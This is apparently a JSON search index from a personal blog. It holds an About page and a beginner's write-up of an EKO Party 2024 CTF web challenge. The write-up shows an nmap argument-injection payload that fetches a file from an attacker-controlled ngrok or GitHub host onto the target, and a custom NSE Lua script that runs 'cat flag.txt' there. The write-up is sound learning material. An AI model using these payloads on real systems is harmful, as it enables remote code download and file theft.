
{
    
    
    
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2024-12-02","image":"","imageAlt":"","link":"http://localhost:1313/about/","summary":"\u003cp\u003eI\u0026rsquo;m still not sure what to add here!\u003c/p\u003e\n\u003cp\u003eMy name is Julian. I work as a cyber security engineer in a startup.\nI\u0026rsquo;m very passionate about offensive cyber security. I\u0026rsquo;m currently studying for OSCP and CPTS.\nI\u0026rsquo;m also a Python lover obsessed with automating everything.\u003c/p\u003e","tags":[],"text":"i\u0026rsquo;m still not sure what to add here!\nmy name is julian. i work as a cyber security engineer in a startup. i\u0026rsquo;m very passionate about offensive cyber security. i\u0026rsquo;m currently studying for oscp and cpts. i\u0026rsquo;m also a python lover obsessed with automating everything.\ni use arch btw (and neovim).\n","title":"About"},{"date":"2024-12-02","image":"","imageAlt":"","link":"http://localhost:1313/posts/ekoparty_ctf_kulkan_writeup/","summary":"\u003cp\u003eHi! I hope this finds you well on the other side of the screen :)\nTLDR; if you just want to focus on the write-up, you can skip the context section ;)\u003c/p\u003e","tags":["command-injection","ctf","writeup"],"text":"hi! i hope this finds you well on the other side of the screen :) tldr; if you just want to focus on the write-up, you can skip the context section ;)\ncontext this is my first write up, and also my first post on my site, so i would like to provide some context. my name is julian, i work as a cybersecurity engineer at a payments startup. i have always enjoyed offensive cybersecurity and penetration testing, but never really focused on it until earlier this year. and as part of this journey, i also started playing ctfs.\nthis month i had the opportunity to help at the eko party cyber security conference in buenos aires, argentina (where i live). it\u0026rsquo;s the biggest cybersecurity conference in latin america. the conference was amazing, there were a lot of great talks and the energy of the people there was amazing. i really enjoyed it. like almost every cybersec conference, it had a ctf! so of course i signed up. i signed up as a team with my coworkers, but they couldn\u0026rsquo;t make it to the conference, and since they were working while i was there, they didn\u0026rsquo;t have a lot of time to participate in the ctf remotely. so since i was on my own and spent most of the day at the conference bouncing between amazing talks, i didn\u0026rsquo;t have a lot of time to focus on the ctf. anyway, i really enjoyed one of the challenges, so i thought it was a great excuse to write my first post. so here we are.\nas i said, i\u0026rsquo;m just starting out on the \u0026ldquo;offensive\u0026rdquo; side of cybersecurity, so i\u0026rsquo;m writing this as i\u0026rsquo;d like to be explained if i were on the other side of the screen. although i have no doubt that anyone reading it, regardless of their expertise, will find something useful here.\nhands on this is the challenge. we have a web application where our task is \u0026ldquo;see if you can find a way to cat the flag\u0026rdquo;. they give us a url of an instancer that gives us 2 minutes to find the flag, but for testing and finding the vulnerability, they give us a zip with the source code.\nthis is what the instancer looks like:\nthe downloaded code has a python application and a docker file. so i build the docker image, run it, and when we access the provided url we find a web application like this:\nit asks for a target (hostname/ip) and we can choose a command: ping, dig or nmap.\nso it\u0026rsquo;s kind of obvious that we should try to find some kind of command injection here to cat the flag.\ni started with the \u0026ldquo;ping\u0026rdquo; and \u0026ldquo;dig\u0026rdquo; commands. i tried a bunch of different command injection payloads from hacktricks, but none of them worked. i also tried some of these payloads with the nmap command, also with no result.\nat this point i started to think it wasn\u0026rsquo;t the usual command injection, so i started reading documentation about the options and flags of these commands.\nmeanwhile, being a bit curious, i opened the python file running the server for the challenge and found that the code used the shlex.split() method to sanitize the command before executing it. after some research, i found out that this is a very safe way to execute commands through python. i\u0026rsquo;m a python developer, so this ended up being useful to learn. and it also confirmed my theory that this was not a common command injection vulnerability. (some may think it was cheating to see the code since it was supposed to be a black-box challenge, but in my defense, looking at the code only confirmed the theory i already had).\ndid some research on the options and flags for each command. didn\u0026rsquo;t find anything useful for ping and dig. when i started to do some research for the nmap command, i remembered the --script flag that allows us to run some custom scripts with nmap on the target host. so i thought maybe there was already a script that could help me.\nafter reading the nmap scripts doc i found that the http-fetch script might be useful. this script allows us to retrieve files from servers.\nthe first thing i did was try to use this script from the challenge web application. since i was running it locally, i started a python http server locally:\nand started ngrok: ngrok http 127.0.0.1:9000.\nand executed the nmap command with the payload:\n--script http-fetch --script-args http-fetch.url=test.txt,http-fetch.destination=/tmp/test e52d-181-164-0-217.ngrok-free.app and it worked!\nbut when i opened the downloaded file\u0026hellip;\nit wasn\u0026rsquo;t what i expected (\u0026ldquo;this is a test file\u0026rdquo;). instead, it downloaded the ngrok warning page. so, looking for alternatives, i ended up hosting the file in a public repo on github, and it worked as expected!\nok, so now we can upload files to the server\u0026hellip; but what can we do with them? after some research, re-reading the [nmap scripts doc] (https://nmap.org/nsedoc/scripts/), i didn\u0026rsquo;t find anything useful\u0026hellip; but after a while i had an idea\u0026hellip; i can write my own nmap nse script to catch the flag!\none important thing to know is whether it is possible to run nse scripts that are not stored in the nmap scripts folder. and yes, it is:\nso i started reading the nmap script writing tutorial and with that and a lot of help from chatgpt i ended up with this nse script:\n-- define the description and category description = [[ this script reads the content of a file called \u0026#39;flag.txt\u0026#39; in the current directory. ]] categories = {\u0026#34;discovery\u0026#34;, \u0026#34;intrusive\u0026#34;} -- import necessary libraries local stdnse = require(\u0026#34;stdnse\u0026#34;) -- define the rule function to specify when this script should run hostrule = function(host) return true -- always run on specified target end -- define the main action function action = function(host) -- execute a command to read the file content local file = io.popen(\u0026#34;cat flag.txt\u0026#34;, \u0026#34;r\u0026#34;) if not file then return \u0026#34;error: could not read file\u0026#34; end -- read file content local content = file:read(\u0026#34;*a\u0026#34;) file:close() if content then return \u0026#34;flag.txt content:\\n\u0026#34; .. content else return \u0026#34;error: no content found in flag.txt\u0026#34; end end and hosted it in the github repository i created earlier.\nso now we have everything ready, we just need to try it out.\nfirst, i downloaded the nse script into the target as we did before.\nin the scan result we can get the full location where it was downloaded. so with the full location of our nse script we can now run it:\nnmap www.google.com --script /tmp/flag-reader/185.199.111.133/443/jstrah00/expose-files/master/%2fjstrah00%2fexpose-files%2fmaster%2fflag-reader.nse (when running it in the web application, we omit the nmap)\nand it worked!\nso now we replicate this in the \u0026ldquo;production environment\u0026rdquo; and we have our flag :)\nconclusion this was a really fun challenge. in my opinion it is a bit hard to be classified as easy as it is. as a person just starting out in ctfs, it was the first time i had to build a \u0026ldquo;custom\u0026rdquo; script to solve one, and i really liked the challenge. i learned a lot from it, especially these key points:\nusing shlex.split() is a great way to safely execute commands in python. ngrok is not always the best way to expose files. now i can write my own custom nse scripts! nmap is powerful. so that was it! i hope you enjoyed reading this and learned something new. if you have any questions, comments, or anything else you want to discuss, feel free to contact me!\nthanks for reading! have a nice day!\n","title":"Kulkan Writeup - EKO Party CTF 2024"}]
}

